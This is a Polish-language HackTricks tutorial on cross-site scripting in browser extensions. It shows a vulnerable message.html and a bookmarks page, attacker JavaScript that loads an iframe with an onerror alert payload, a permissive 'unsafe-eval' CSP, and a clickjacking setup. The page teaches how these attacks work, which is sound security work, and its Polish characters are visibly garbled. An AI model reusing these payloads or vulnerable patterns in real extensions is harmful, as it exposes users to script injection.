# BrowExt - Przykad XSS

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Cross-Site Scripting (XSS) za pomoc Iframe

W tej konfiguracji, **skrypt treci** jest implementowany w celu utworzenia Iframe, w kt贸rym zawarta jest URL z parametrami zapytania jako 藕r贸do Iframe:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
Jest publicznie dostpna strona HTML o nazwie **`message.html`**, kt贸ra dynamicznie dodaje zawarto do ciaa dokumentu na podstawie parametr贸w w adresie URL:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
Wykonuje si zoliwy skrypt na stronie przeciwnika, modyfikujc parametr `content` 藕r贸da Iframe, aby wprowadzi **payload XSS**. Osiga si to poprzez aktualizacj 藕r贸da Iframe, aby zawierao szkodliwy skrypt:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
Nadmiernie liberalna polityka zabezpiecze treci, taka jak:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
pozwala na wykonanie kodu JavaScript, co czyni system podatnym na ataki XSS.

Alternatywnym podejciem do wywoania ataku XSS jest utworzenie elementu Iframe i ustawienie jego 藕r贸da tak, aby zawierao szkodliwy skrypt jako parametr `content`:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-based XSS + ClickJacking

Ten przykad zosta zaczerpnity z [oryginalnego wpisu](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

G贸wny problem wynika z podatnoci na DOM-based Cross-site Scripting (XSS) znajdujcej si w **`/html/bookmarks.html`**. Problematyczny kod JavaScript, bdcy czci **`bookmarks.js`**, jest szczeg贸owo opisany poni偶ej:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
Ten fragment kodu pobiera **warto** z pola wejciowego **`txtName`** i u偶ywa **konkatenacji cig贸w znak贸w do generowania kodu HTML**, kt贸ry jest nastpnie dodawany do DOM za pomoc funkcji `.append()` z biblioteki jQuery.

Zazwyczaj polityka bezpieczestwa zawartoci (CSP) rozszerzenia Chrome uniemo偶liwia wystpowanie takich podatnoci. Jednak ze wzgldu na **relaksacj CSP z u偶yciem 'unsafe-eval'** oraz wykorzystanie metod manipulacji DOM z biblioteki jQuery (kt贸re u偶ywaj [`globalEval()`](https://api.jquery.com/jquery.globaleval/) do przekazywania skrypt贸w do funkcji [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) podczas wstawiania do DOM), nadal istnieje mo偶liwo wykorzystania podatnoci.

Cho ta podatno jest istotna, jej wykorzystanie zazwyczaj zale偶y od interakcji u偶ytkownika: odwiedzenia strony, wprowadzenia ataku XSS i aktywacji przycisku "Dodaj".

Aby zwikszy wykorzystanie tej podatnoci, wykorzystuje si dodatkow podatno **clickjacking**. Manifest rozszerzenia Chrome zawiera obszern polityk `web_accessible_resources`:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
Warto zauwa偶y, 偶e strona **`/html/bookmarks.html`** jest podatna na osadzanie w ramkach, co czyni j podatn na **clickjacking**. Ta podatno jest wykorzystywana do osadzenia strony w witrynie atakujcego, nakadajc na ni elementy DOM w celu oszukaczego przeprojektowania interfejsu. Ta manipulacja sprawia, 偶e ofiary niewiadomie oddziauj z podstawowym rozszerzeniem.

## Odwoania

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
